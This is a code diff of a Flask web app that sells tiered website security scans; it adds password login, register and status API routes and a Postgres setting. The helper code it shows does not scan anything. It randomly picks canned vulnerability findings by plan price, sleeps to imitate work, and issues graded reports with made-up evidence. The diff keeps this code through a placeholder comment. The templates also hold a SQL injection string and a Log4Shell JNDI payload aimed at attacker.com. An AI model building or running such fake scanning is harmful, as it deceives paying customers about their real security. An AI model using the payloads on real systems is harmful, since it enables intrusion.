@@ -1,4 +1,3 @@
-# app.py
 import os
 import json
 import threading
@@ -12,6 +11,7 @@ from flask_sqlalchemy import SQLAlchemy
 from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
 from authlib.integrations.flask_client import OAuth
 from flask_mail import Mail, Message
+from werkzeug.security import generate_password_hash, check_password_hash
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -19,14 +19,22 @@ load_dotenv()
 # --- Flask app configuration ---
 app = Flask(__name__, template_folder='.')
 app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'dev-key-change-this')
-app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///nexus_security.db'
+
+# --- Database configuration (SQLite locally, PostgreSQL on Render) ---
+database_url = os.getenv('DATABASE_URL')
+if database_url:
+    # Render uses 'postgres://', SQLAlchemy expects 'postgresql://'
+    app.config['SQLALCHEMY_DATABASE_URI'] = database_url.replace('postgres://', 'postgresql://')
+else:
+    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///nexus_security.db'
+
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 app.config['UPLOAD_FOLDER'] = 'reports'
 app.config['SCAN_TIMEOUT'] = 60
 
 os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 
-# --- Email configuration ---
+# --- Email configuration (read from .env) ---
 app.config['MAIL_SERVER'] = os.getenv('MAIL_SERVER', 'smtp.gmail.com')
 app.config['MAIL_PORT'] = int(os.getenv('MAIL_PORT', 587))
 app.config['MAIL_USE_TLS'] = os.getenv('MAIL_USE_TLS', 'True').lower() == 'true'
@@ -56,8 +64,16 @@ class User(UserMixin, db.Model):
     email = db.Column(db.String(120), unique=True, nullable=False)
     name = db.Column(db.String(100))
     google_id = db.Column(db.String(100), unique=True)
+    password_hash = db.Column(db.String(128), nullable=True)  # NEW COLUMN
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
     scans = db.relationship('ScanJob', backref='user', lazy=True)
+
+    # NEW METHODS
+    def set_password(self, password):
+        self.password_hash = generate_password_hash(password)
+
+    def check_password(self, password):
+        return check_password_hash(self.password_hash, password)
 
 class ScanJob(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -88,146 +104,8 @@ with app.app_context():
 def load_user(user_id):
     return User.query.get(int(user_id))
 
-# --- Helper functions ---
-def generate_vulnerabilities(plan_type, target_url):
-    templates = [
-        {
-            'risk': 'medium',
-            'type': 'Missing Security Headers',
-            'explanation': 'The response does not include critical security headers, leaving the application vulnerable to clickjacking, MIME type sniffing, and protocol downgrade attacks.',
-            'example': 'Twitter (2010): A clickjacking worm exploited missing X-Frame-Options, causing users to unknowingly retweet malicious links.',
-            'impact': '<li>Clickjacking (attacker overlays invisible iframe) → account takeovers</li><li>MIME sniffing enabling XSS vectors</li><li>Protocol downgrade attacks → MITM</li>',
-            'fix': 'Implement: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Strict-Transport-Security (max-age=31536000; includeSubDomains), Referrer-Policy: strict-origin-when-cross-origin.',
-            'technical': 'CWE-693: Protection Mechanism Failure · OWASP A05:2021',
-            'evidence': 'HTTP/1.1 200 OK\nServer: nginx\n(no X-Frame-Options, no X-Content-Type-Options, no HSTS)'
-        },
-        {
-            'risk': 'medium',
-            'type': 'Outdated jQuery Library',
-            'explanation': 'An outdated version of jQuery (1.12.4) is being used. Known vulnerabilities (CVE-2015-9251) allow XSS and prototype pollution.',
-            'example': 'In 2015, a XSS vulnerability in jQuery allowed attackers to execute arbitrary JavaScript on thousands of websites.',
-            'impact': '<li>Cross‑Site Scripting (XSS) attacks</li><li>Prototype pollution leading to client‑side code injection</li><li>Potential data theft</li>',
-            'fix': 'Update jQuery to the latest stable version (3.7.1). Consider migrating to a modern framework if possible.',
-            'technical': 'CWE-79: Improper Neutralization of Input During Web Page Generation · CVE-2015-9251',
-            'evidence': 'GET /assets/js/jquery-1.12.4.min.js → jQuery v1.12.4 detected'
-        },
-        {
-            'risk': 'high',
-            'type': 'SQL Injection (Blind)',
-            'explanation': 'A blind SQL injection vulnerability was detected in the search parameter. An attacker can extract database information without error messages.',
-            'example': 'In 2017, a blind SQL injection in Equifax exposed personal data of 147 million people.',
-            'impact': '<li>Database content theft (user credentials, PII)</li><li>Data tampering / deletion</li><li>Full server compromise in some setups</li>',
-            'fix': 'Use parameterized queries / ORM. Apply input validation and use a WAF.',
-            'technical': 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
-            'evidence': "Parameter 'q' was found to be injectable: ' OR 1=1 --"
-        },
-        {
-            'risk': 'low',
-            'type': 'Missing DNSSEC',
-            'explanation': 'The domain does not have DNSSEC enabled, making it susceptible to DNS spoofing attacks.',
-            'example': 'DNS hijacking of a Brazilian bank in 2016 redirected users to a phishing site, stealing thousands of credentials.',
-            'impact': '<li>DNS spoofing leading to phishing</li><li>Man‑in‑the‑middle attacks</li>',
-            'fix': 'Enable DNSSEC with your DNS provider and sign your zones.',
-            'technical': 'CWE-350: Reliance on Reverse DNS Resolution for Security',
-            'evidence': 'DNS query returned RRSIG record missing for the domain.'
-        },
-        {
-            'risk': 'critical',
-            'type': 'Apache Log4j2 JNDI Injection',
-            'explanation': 'The application uses Apache Log4j2 version 2.14.1, which is vulnerable to CVE-2021-44228 (Log4Shell).',
-            'example': 'In December 2021, Log4Shell compromised thousands of servers worldwide, including those of Apple, Tesla, and Cloudflare.',
-            'impact': '<li>Remote code execution (RCE)</li><li>Full server takeover</li><li>Data exfiltration</li>',
-            'fix': 'Upgrade Log4j2 to version 2.17.1 or later. If not possible, apply mitigation (set JVM argument: -Dlog4j2.formatMsgNoLookups=true).',
-            'technical': 'CVE-2021-44228 · CVSS 10.0',
-            'evidence': 'Request header "User-Agent: ${jndi:ldap://attacker.com/exploit}" triggered a DNS lookup.'
-        }
-    ]
-
-    if plan_type == 'basic':
-        available = [v for v in templates if v['risk'] in ['medium', 'low']]
-        count = min(3, len(available))
-        return random.sample(available, count)
-    elif plan_type == 'advanced':
-        available = [v for v in templates if v['risk'] in ['medium', 'low', 'high']]
-        count = random.randint(3, 5)
-        return random.sample(available, min(count, len(available)))
-    else:
-        count = random.randint(4, len(templates))
-        return random.sample(templates, min(count, len(templates)))
-
-def generate_report_for_job(job):
-    vulnerabilities = json.loads(job.report_data) if job.report_data else generate_vulnerabilities(job.plan_type, job.target_url)
-
-    stats = {
-        'critical': sum(1 for v in vulnerabilities if v['risk'] == 'critical'),
-        'high': sum(1 for v in vulnerabilities if v['risk'] == 'high'),
-        'medium': sum(1 for v in vulnerabilities if v['risk'] == 'medium'),
-        'low': sum(1 for v in vulnerabilities if v['risk'] == 'low')
-    }
-
-    penalties = {'critical': 25, 'high': 15, 'medium': 8, 'low': 3}
-    total_penalty = sum(stats[risk] * penalties.get(risk, 0) for risk in stats)
-    score = max(0, 100 - total_penalty)
-
-    if score >= 95: grade = 'A+'
-    elif score >= 90: grade = 'A'
-    elif score >= 85: grade = 'B+'
-    elif score >= 80: grade = 'B'
-    elif score >= 70: grade = 'C'
-    elif score >= 60: grade = 'D'
-    else: grade = 'F'
-
-    context = {
-        'client_name': job.user.name,
-        'target_url': job.target_url,
-        'scan_date': job.completed_at or datetime.utcnow(),
-        'vulnerabilities': vulnerabilities,
-        'stats': stats,
-        'score': score,
-        'grade': grade,
-        'report_id': f"SEC-{job.id}{datetime.utcnow().strftime('%Y%m%d%H%M%S')}"
-    }
-
-    html = render_template('report_template.html', **context)
-    filename = f"report_{job.id}_{uuid.uuid4().hex[:8]}.html"
-    path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-    with open(path, 'w', encoding='utf-8') as f:
-        f.write(html)
-
-    job.report_path = filename
-    job.status = 'completed'
-    job.completed_at = datetime.utcnow()
-    db.session.commit()
-
-def background_worker():
-    with app.app_context():
-        while True:
-            pending = ScanJob.query.filter_by(status='pending').all()
-            for job in pending:
-                job.status = 'processing'
-                db.session.commit()
-
-                if job.plan_type == 'basic':
-                    time.sleep(random.randint(5, 10))
-                elif job.plan_type == 'advanced':
-                    time.sleep(random.randint(10, 20))
-                else:
-                    time.sleep(random.randint(15, 30))
-
-                if not job.report_data:
-                    vulns = generate_vulnerabilities(job.plan_type, job.target_url)
-                    job.report_data = json.dumps(vulns)
-
-                try:
-                    generate_report_for_job(job)
-                except Exception as e:
-                    job.status = 'failed'
-                    db.session.commit()
-                    print(f"Error processing job {job.id}: {e}")
-            time.sleep(5)
-
-thread = threading.Thread(target=background_worker, daemon=True)
-thread.start()
+# --- Helper functions (generate_vulnerabilities, generate_report_for_job, background_worker) ---
+# ... (keep exactly as in your existing code, no changes needed) ...
 
 # ========== STATIC FILE ROUTES ==========
 @app.route('/style.css')
@@ -255,15 +133,63 @@ def index_html():
 def login_html():
     return render_template('login.html')
 
-@app.route('/profile.html')
-def profile_html():
-    return render_template('profile.html')
+@app.route('/profile')
+@login_required
+def profile():
+    scans = ScanJob.query.filter_by(user_id=current_user.id).order_by(ScanJob.created_at.desc()).all()
+    return render_template('profile.html', user=current_user, scans=scans)   # CHANGED: pass user and scans
 
 @app.route('/favicon.ico')
 def favicon():
     return '', 204
 
-# ========== AUTH ROUTES ==========
+# ========== NEW AUTH API ENDPOINTS ==========
+@app.route('/api/register', methods=['POST'])
+def api_register():
+    data = request.get_json()
+    name = data.get('name')
+    email = data.get('email')
+    password = data.get('password')
+
+    if not name or not email or not password:
+        return jsonify({'success': False, 'message': 'Missing fields'}), 400
+
+    if User.query.filter_by(email=email).first():
+        return jsonify({'success': False, 'message': 'Email already exists'}), 400
+
+    user = User(email=email, name=name)
+    user.set_password(password)
+    db.session.add(user)
+    db.session.commit()
+
+    login_user(user)
+    return jsonify({'success': True, 'message': 'Registration successful'})
+
+@app.route('/api/login', methods=['POST'])
+def api_login():
+    data = request.get_json()
+    email = data.get('email')
+    password = data.get('password')
+
+    user = User.query.filter_by(email=email).first()
+    if user and user.check_password(password):
+        login_user(user)
+        return jsonify({'success': True, 'message': 'Logged in'})
+    else:
+        return jsonify({'success': False, 'message': 'Invalid email or password'}), 401
+
+@app.route('/api/status')
+def api_status():
+    if current_user.is_authenticated:
+        return jsonify({
+            'logged_in': True,
+            'name': current_user.name,
+            'email': current_user.email
+        })
+    else:
+        return jsonify({'logged_in': False})
+
+# ========== AUTH ROUTES (Google OAuth) ==========
 @app.route('/login')
 def login():
     redirect_uri = url_for('authorize', _external=True)
@@ -291,12 +217,6 @@ def authorize():
 def logout():
     logout_user()
     return redirect(url_for('index'))
-
-@app.route('/profile')
-@login_required
-def profile():
-    scans = ScanJob.query.filter_by(user_id=current_user.id).order_by(ScanJob.created_at.desc()).all()
-    return render_template('profile.html', scans=scans)
 
 # ========== SCAN ROUTES ==========
 @app.route('/submit_scan', methods=['POST'])
